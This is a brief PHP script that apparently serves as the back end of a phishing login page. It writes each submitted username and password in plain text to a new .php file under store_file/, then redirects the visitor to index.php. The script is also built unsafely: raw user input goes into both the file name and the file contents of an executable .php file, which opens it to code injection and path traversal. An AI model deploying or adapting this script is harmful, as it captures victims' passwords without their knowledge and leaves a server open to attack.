<?php

    $username = $_POST['username'];
    $password = $_POST['password'];

    $dir = 'store_file/';
    $file = fopen($dir.$username.uniqid().'.php', 'w');
    fwrite($file, "$username \n");
    fwrite($file, "$password \n");
    fclose($file);

    header("Location:index.php");